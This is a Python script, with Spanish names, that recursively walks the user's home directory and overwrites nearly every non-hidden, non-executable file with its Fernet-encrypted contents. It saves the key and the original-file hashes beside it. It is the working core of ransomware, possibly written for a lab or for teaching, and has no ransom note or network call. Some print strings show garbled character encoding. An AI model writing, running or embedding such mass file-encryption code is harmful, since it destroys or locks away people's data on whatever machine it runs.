import os
from cryptography.fernet import Fernet
import json
import hashlib

EXTENSIONES_PROHIBIDAS = ['.so', '.exe', '.dll', '.img', '.iso']
ARCHIVOS_EXCLUIDOS = ['key.key', 'encripta.py', 'desencripta.py', 'hashes.json']

def generar_key(path="key.key"):
    key = Fernet.generate_key()
    with open(path, "wb") as f:
        f.write(key)
    return key

def calcular_hash(data):
    return hashlib.sha256(data).hexdigest()

def es_oculto(path):
    return any(p.startswith('.') for p in path.split(os.sep))

def encontrar_archivos(ruta_home, key_path, script_path):
    archivos = []
    for dirpath, _, filenames in os.walk(ruta_home):
        if es_oculto(dirpath):
            continue
        for nombre in filenames:
            full_path = os.path.join(dirpath, nombre)
            _, ext = os.path.splitext(nombre)
            if (
                ext.lower() in EXTENSIONES_PROHIBIDAS or
                full_path == key_path or
                full_path == script_path or
                nombre in ARCHIVOS_EXCLUIDOS
            ):
                continue
            archivos.append(full_path)
    return archivos

def encriptar_archivos(archivos, key):
    f = Fernet(key)
    hashes = {}
    for archivo in archivos:
        try:
            with open(archivo, "rb") as file:
                datos = file.read()
            hash_original = calcular_hash(datos)
            datos_encriptados = f.encrypt(datos)
            with open(archivo, "wb") as file:
                file.write(datos_encriptados)
            hashes[archivo] = hash_original
            print(f"âœ” Encriptado: {archivo}")
        except Exception as e:
            print(f"âœ˜ Error con {archivo}: {e}")
    return hashes

if __name__ == "__main__":
    ruta_home = os.path.expanduser("~")
    key_path = os.path.realpath("key.key")
    script_path = os.path.realpath(__file__)

    if not os.path.exists("key.key"):
        key = generar_key()
    else:
        with open("key.key", "rb") as f:
            key = f.read()

    archivos = encontrar_archivos(ruta_home, key_path, script_path)
    hashes = encriptar_archivos(archivos, key)

    with open("hashes.json", "w") as f:
        json.dump(hashes, f)

    print("\n[ðŸ”’] EncriptaciÃ³n completada con Ã©xito.")
